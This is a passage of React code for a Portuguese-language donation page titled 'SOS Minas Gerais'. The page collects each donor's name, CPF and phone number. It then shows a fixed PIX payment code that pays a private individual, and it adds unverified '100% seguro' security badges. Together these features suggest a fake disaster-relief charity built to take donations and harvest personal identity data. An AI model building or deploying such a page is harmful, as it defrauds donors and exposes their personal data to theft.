            <p className="text-xs text-gray-500 font-bold uppercase tracking-wider mb-1">Você está apoiando</p>
            <h2 className="font-bold text-gray-900 leading-tight line-clamp-2">SOS Minas Gerais</h2>
          </div>
        </div>

        {/* Card Central */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 mb-8">
          {!pixGenerated ? (
            <div className="space-y-6">
              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">Valor da doação</label>
                <div className="relative">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold">R$</span>
                  <input 
                    type="number" 
                    placeholder="0,00" 
                    value={value}
                    onChange={(e) => setValue(e.target.value)}
                    className="w-full pl-12 pr-4 py-4 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#00c853] focus:border-[#00c853] outline-none font-bold text-gray-900 bg-gray-50 focus:bg-white transition-colors text-xl" 
                  />
                </div>
              </div>

              <div className="pt-4 border-t border-gray-100 space-y-4">
                <h3 className="font-bold text-gray-900 text-sm uppercase tracking-wide">Seus Dados</h3>
                
                <div>
                  <label className="block text-xs font-bold text-gray-600 mb-1.5">Nome Completo</label>
                  <input 
                    type="text" 
                    placeholder="Digite seu nome completo" 
                    value={nome}
                    onChange={(e) => setNome(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#00c853] focus:border-[#00c853] outline-none text-gray-900 bg-gray-50 focus:bg-white transition-colors text-sm" 
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold text-gray-600 mb-1.5">CPF</label>
                  <input 
                    type="text" 
                    placeholder="000.000.000-00" 
                    value={cpf}
                    onChange={(e) => setCpf(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#00c853] focus:border-[#00c853] outline-none text-gray-900 bg-gray-50 focus:bg-white transition-colors text-sm" 
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold text-gray-600 mb-1.5">Número de Telefone</label>
                  <input 
                    type="tel" 
                    placeholder="(00) 00000-0000" 
                    value={telefone}
                    onChange={(e) => setTelefone(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#00c853] focus:border-[#00c853] outline-none text-gray-900 bg-gray-50 focus:bg-white transition-colors text-sm" 
                  />
                </div>
              </div>

              <button 
                onClick={handleGeneratePix}
                disabled={!value || Number(value) <= 0 || !nome || !cpf || !telefone || isLoading}
                className="w-full bg-[#00c853] hover:bg-green-600 disabled:bg-green-300 text-white font-bold py-4 rounded-xl text-lg transition-all shadow-md hover:shadow-lg transform hover:-translate-y-0.5 duration-200 flex items-center justify-center gap-2"
              >
                {isLoading ? 'Processando...' : 'Continuar para o PIX'}
              </button>
            </div>
          ) : (
            <div className="flex flex-col items-center space-y-6 animate-in fade-in zoom-in duration-300">
              <div className="text-center">
                <h3 className="font-black text-xl text-gray-900 mb-1">Quase lá!</h3>
                <p className="text-sm text-gray-600">Copie o código abaixo para pagar no seu banco.</p>
              </div>

              <div className="p-4 bg-white border-2 border-green-100 rounded-2xl shadow-sm">
                <img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO%20R%20DA%20S%20SOUSA6008TRINDADE62070503***63045F6E" alt="QR Code PIX" className="w-48 h-48 rounded-lg" referrerPolicy="no-referrer" />
              </div>
              
              <div className="w-full space-y-3">
                <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 text-center font-mono text-gray-800 font-bold break-all text-sm">
                  00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO R DA S SOUSA6008TRINDADE62070503***63045F6E
                </div>
                <button 
                  onClick={handleCopy}
                  className="w-full flex items-center justify-center gap-2 bg-[#eefcf1] hover:bg-green-100 text-[#00c853] font-bold py-3.5 rounded-xl transition-colors"
                >
                  {copied ? <Check size={20} /> : <Copy size={20} />}
                  {copied ? 'Código copiado!' : 'Copiar código PIX'}
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Security Badge */}
        <div className="flex flex-col items-center justify-center gap-3 text-gray-500 text-sm font-medium">
          <div className="flex items-center gap-2">
            <ShieldCheck size={18} className="text-[#00c853]" />
            Ambiente 100% seguro
          </div>
          <div className="flex items-center gap-4 text-xs">
            <span className="flex items-center gap-1"><Lock size={14} /> Criptografia de Ponta</span>
            <span className="flex items-center gap-1"><Check size={14} /> Dados Protegidos</span>
          </div>
        </div>
      </div>
    </div>
  );
}
